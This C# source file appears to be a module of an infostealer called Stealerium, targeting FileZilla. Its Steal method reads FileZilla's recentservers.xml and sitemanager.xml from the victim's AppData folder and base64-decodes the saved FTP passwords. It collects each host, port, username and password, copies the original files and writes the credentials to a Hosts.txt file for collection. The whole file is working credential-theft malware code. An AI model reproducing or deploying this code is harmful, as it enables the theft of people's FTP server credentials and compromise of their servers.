using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using Stealerium.Helpers;

namespace Stealerium.Target
{
    internal sealed class FileZilla
    {
        // Get filezilla .xml files
        private static string[] GetPswPath()
        {
            var fz = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\FileZilla\";
            return new[] {fz + "recentservers.xml", fz + "sitemanager.xml"};
        }

        private static List<Password> Steal(string sSavePath)
        {
            var lpPasswords = new List<Password>();

            var files = GetPswPath();
            // If files not exists
            if (!File.Exists(files[0]) && !File.Exists(files[1]))
                return lpPasswords;

            foreach (var pwFile in files)
                try
                {
                    if (!File.Exists(pwFile))
                        continue;

                    // Open xml document
                    var xDoc = new XmlDocument();
                    xDoc.Load(pwFile);

                    foreach (XmlNode xNode in xDoc.GetElementsByTagName("Server"))
                    {
                        var innerText = xNode?["Pass"]?.InnerText;
                        if (innerText == null) continue;
                        var pPassword = new Password
                        {
                            Url = "ftp://" + xNode["Host"]?.InnerText + ":" + xNode["Port"]?.InnerText + "/",
                            Username = xNode["User"]?.InnerText,
                            Pass = Encoding.UTF8.GetString(Convert.FromBase64String(innerText))
                        };

                        Counter.FtpHosts++;
                        lpPasswords.Add(pPassword);
                    }

                    // Copy file
                    File.Copy(pwFile, Path.Combine(sSavePath, new FileInfo(pwFile).Name));
                }
                catch (Exception ex)
                {
                    Logging.Log("Filezilla >> Failed collect passwords\n" + ex);
                }

            return lpPasswords;
        }

        // Format FileZilla passwords
        private static string FormatPassword(Password pPassword)
        {
            return $"Url: {pPassword.Url}\nUsername: {pPassword.Username}\nPassword: {pPassword.Pass}\n\n";
        }

        // Write FileZilla passwords
        public static void WritePasswords(string sSavePath)
        {
            Directory.CreateDirectory(sSavePath);
            var pPasswords = Steal(sSavePath);
            if (pPasswords.Count != 0)
            {
                foreach (var p in pPasswords)
                    File.AppendAllText(sSavePath + "\\Hosts.txt", FormatPassword(p));
                return;
            }

            Directory.Delete(sSavePath);
        }
    }
}